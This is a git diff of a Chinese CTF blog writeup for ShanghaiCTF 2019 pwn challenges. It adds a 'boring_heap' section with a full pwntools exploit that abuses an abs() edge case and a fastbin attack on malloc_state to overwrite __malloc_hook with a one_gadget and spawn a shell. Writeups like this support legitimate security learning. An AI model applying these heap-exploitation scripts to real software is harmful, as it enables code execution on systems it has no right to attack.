@@ -3,7 +3,7 @@ title: ShanghaiCTF
 date: 2019-11-03
 categories: 
 - competition
-tags: heap
+tags: heap __malloc_arena
 ---
 
 # pwn的writeup
@@ -22,7 +22,7 @@ tags: heap
 
 但是这里需要注意的一个地方是记得在`top chunk`之前做分割！！！
 
-## exp
+### exp
 
 ```python
 from pwn import *
@@ -96,7 +96,9 @@ sh.close()
 
 这个地方需要密码堆的内容和你输入的内容相等才能够调用，一开始一直想不出来，但是感谢一位同学提供的思路。  
 
-比如这里我们要爆破`free`的地址，但我们不必往第一项里写`free@got`，可以先写`free@got + 5`，由于地址的最低位是`\x00\x00`,所以我们只需要输入`\x7f`就可以调用第二项的函数。那么接下来输入+4+3……，就可以一位一位爆破出来。
+比如这里我们要爆破`free`的地址，但我们不必往第一项里写`free@got`，可以先写`free@got + 5`，由于地址的最低位是`\x00\x00`,所以我们只需要输入`\x7f`就可以调用第二项的函数。那么接下来输入+4+3……，就可以一位一位爆破出来。  
+
+### exp
 
 ```python
 from pwn import *
@@ -125,7 +127,7 @@ def login(id,length,pswd):
     sh.sendlineafter('id:\n',str(id))
     sh.sendlineafter('length:\n',str(length))
     sh.sendafter('password:\n',str(pswd))
-    
+
 def delete(id):
     sh.sendlineafter('Choice:\n',str(3))
     sh.sendlineafter('id:\n',str(id))
@@ -166,3 +168,160 @@ login(0,0x8,'/bin/sh')
 sh.interactive()
 sh.close()
 ```
+
+## boring_heap
+
+这个题一开始的漏洞我觉得就是没有，完美的一个程序（微笑.jpg），问了大佬才知道的。  
+
+> 计算机用补码存储数据，也就是说负数比正数多一个，那么我们在`abs`这个最大的负数的时候是没有对应的正数的，所以返回的仍旧是这个负数。  
+> 题目这个地方`abs`之后会取余他的`size`，只有`0x30`得出来不是0，根据C语言取余的特性会返回一个绝对值小于`0x30`的负数，也就是`-0x20`。  
+
+先分配5个堆，`#0`用来当做溢出点，`#4` 用来分隔 `top chunk`。  
+`edit` `#1` 可以将`#1`的size改成`0xd1`，这样在`free` `#1`的时候这个堆就会被放到`unsorted bin`里面。既可以泄露地址也可以overlap。  
+overlap之后就可以进行`fastbin attack`。  
+
+> `main_arena` 中使用 `malloc_state` 这个数据结构来管理整个分配区。  
+>
+```C
+struct malloc_state {
+/* Serialize access. */
+mutex_t mutex;              //4bytes
+/* Flags (formerly in max_fast). */
+int flags;                  //4bytes
+#if THREAD_STATS
+/* Statistics for locking. Only used if THREAD_STATS is defined. */
+long stat_lock_direct, stat_lock_loop, stat_lock_wait;
+#endif
+//每个指针占的字节都是8
+/* Fastbins */
+mfastbinptr fastbinsY[NFASTBINS];    //NFASTBINS等于10
+/* Base of the topmost chunk -- not otherwise kept in a bin */
+mchunkptr top;
+/* The remainder from the most recent split of a small request */
+mchunkptr last_remainder;
+/* Normal bins packed as described above */
+mchunkptr bins[NBINS * 2 - 2];      // NBINS 等于128
+/* Bitmap of bins */
+unsigned int binmap[BINMAPSIZE];
+/* Linked list */
+struct malloc_state *next;
+#ifdef PER_THREAD
+/* Linked list for free arenas. */
+struct malloc_state *next_free;
+#endif
+/* Memory allocated from the system in this arena. */
+INTERNAL_SIZE_T system_mem;
+INTERNAL_SIZE_T max_system_mem;
+};
+```
+
+> `__malloc_hook`:  
+> 这个是一个函数指针，在每次malloc调用的时候就会先检查这个指针是否为空，为空则跳过，不为空则执行他。在初始化地址分配的时候，里面存储的是`malloc_hook_ini()`，在这个函数里面将`__malloc_hook` 置为NULL。  
+> <a href = "http://www.luyixian.cn/news_show_187619.aspx"> 具体利用方式 </a>  
+
+>bins里面都是双向链表。在最开始的时候，unsorted bin里面存放的是top chunk的地址。   
+
+但是一般如果要让堆分配到`__malloc_hook`去的话，附近合适的size就是`__malloc_hook - 0x23`处的 `0x7f`,而这题规定死了他的size大小，所以不能让`fastbins`直接分配到`__malloc_hook`。  
+这个题很厉害的地方就在于，可以让`fastbins`的某个指针内容直接为size大小，然后让堆分配到`fastbins`上面去，然后覆盖`malloc_state`里面的`top`指针到`__malloc_hook`附近。  
+
+主要的利用姿势见exp。  
+
+```python
+#coding = utf-8
+
+from pwn import *
+from time import *
+
+context.log_level  = 'debug'
+
+elf = ELF('./pwn')
+libc = elf.libc
+sh = process('./pwn')
+
+def add(choice, cont):
+    sh.sendlineafter("Exit\n", "1")
+    sh.sendlineafter("Large\n", str(choice))
+    sh.sendafter("Content:\n", cont)
+    sleep(0.01)
+
+def edit(idx, where, cont):
+    sh.sendlineafter("Exit\n", "2")
+    sh.sendlineafter("update?\n", str(idx))
+    sh.sendlineafter("update?\n", str(where))
+    sh.sendafter("Content:\n", cont)
+    sleep(0.01)
+
+def delete(idx):
+    sh.sendlineafter("Exit\n", "3")
+    sh.sendlineafter("delete?\n", str(idx))
+
+
+def show(idx):
+    sh.sendlineafter("Exit\n", "4")
+    sh.sendlineafter("view?\n", str(idx))
+
+S = 1
+M = 2
+L = 3
+
+libc.sym['main_arena'] = 0x3c4b20
+libc.sym['one_gadget'] = 0xf1147
+add(S,'0000' + '\n') #0
+add(M,'1111' + '\n') #1
+add(L,'2222' + '\n') #2
+add(M,'3333' + '\n') #3
+add(L,'4444' + '\n') #4
+
+
+payload = p64(0) + p64(0) + p64(0) + p64(0xd1) + '\n'
+edit(1,0x80000000,payload)
+delete(1)
+
+pause()
+add(M,'5555555' + '\n') #5
+show(5)
+
+offset_unsorted_arena = 0x8 + 0x8 * 0xa 
+'''
+int32 mutex
+int32 flag
+int64 fastbin[10]
+int64 top
+int64 last_reminder
+int64 unsorted bin
+'''
+#libc.address = u64(sh.recvuntil('\x7f')[-6:] + '\x00\x00')  - offset_unsorted_arena - libc.sym['main_arena']
+
+libc.address = u64(sh.recvuntil('\x7f')[-6:] + '\x00\x00') - 0xc0 - offset_unsorted_arena - libc.sym['main_arena']
+success('libc_addr : {:#x}'.format(libc.address))
+
+add(L,'6666' + '\n') #6 overlap 2
+add(M,'7777' + '\n') #7 overlap 3
+
+delete(2)
+delete(3)
+
+payload = p64(libc.sym['main_arena'] + 0x10)
+edit(6,0,payload + '\n')
+edit(7,0,p64(0x51) + '\n')
+add(L,'8888' + '\n')
+add(M,'9999' + '\n')
+
+payload = p64(0) * 7 + p64(libc.sym['__malloc_hook'] - 0x10)
+add(L,payload )
+
+
+payload = p64(libc.sym['one_gadget'])
+add(S,payload + '\n')
+
+sh.sendlineafter("Exit\n", "1")
+sh.sendlineafter("Large\n", '1')
+
+sh.interactive()
+```
+
+![malloc_state]("../assets/images/malloc_state.png")
+
+### 疑惑
+
+这里在计算libc的基址的时候，中间为啥要加一个`0xc0`我也不知道，动调的时候加了发现了。
